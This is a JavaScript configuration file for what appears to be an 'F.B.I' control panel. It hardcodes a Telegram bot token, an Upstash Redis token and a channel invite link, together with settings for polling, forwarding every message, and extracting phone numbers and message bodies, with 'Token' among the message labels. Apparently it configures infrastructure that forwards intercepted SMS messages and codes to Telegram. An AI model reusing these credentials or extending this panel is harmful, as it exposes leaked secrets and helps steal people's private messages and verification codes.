/* ═══════════════════════════════════════════════════════════
   F.B.I PANEL CONFIG v11.0
   ═══════════════════════════════════════════════════════════ */
window.SPECTER = {
  BOT_TOKEN: '8648349328:AAGeJlcAsYInvrBRDiF5-jr6UKzrltBeRqY',
  TG_API:    'https://api.telegram.org/bot8648349328:AAGeJlcAsYInvrBRDiF5-jr6UKzrltBeRqY',

  BLOB_BASE: 'https://jsonblob.com/api/jsonBlob',

  /* ═══════ REDIS (Upstash) ═══════ */
  REDIS_URL:   'https://closing-koi-101484.upstash.io',
  REDIS_TOKEN: 'gQAAAAAAAYxsAAIgcDJmZTI0YzE2ZmZjMWI0NmE3OGI3NTkxYjA5OWMwMTQ1ZQ',

  /* ═══════ Telegram Channel Link (icon click) ═══════ */
  TG_CHANNEL_LINK: 'https://t.me/+24tWy5rDPxg4Yjc1',

  LS_BLOB:    'fbi_blob_id',
  LS_CACHE:   'fbi_config_cache',
  LS_SESSION: 'fbi_session',
  LS_ACTIVE:  'fbi_active_device',

  POLL_MS: 500,

  DEFAULT_CONFIG: {
    channelId:        '',
    userId:           '',
    myNumber:         '',
    firebases:        [],
    forwardEnabled:   true,
    forwardMode:      'all',
    botEnabled:       true,
    autoBackup:       true,
    autoBackupHour:   3,
    backupAutoDelete: 500,
    forceJoin:        true,
    numStart: '',
    numEnd:   '',
    msgStart: '',
    msgEnd:   '',
    numLabels: ['To','Receipt','Number','Mobile','Target','Phone'],
    msgLabels: ['Message','Msg','Body','Token','Text']
  }
};
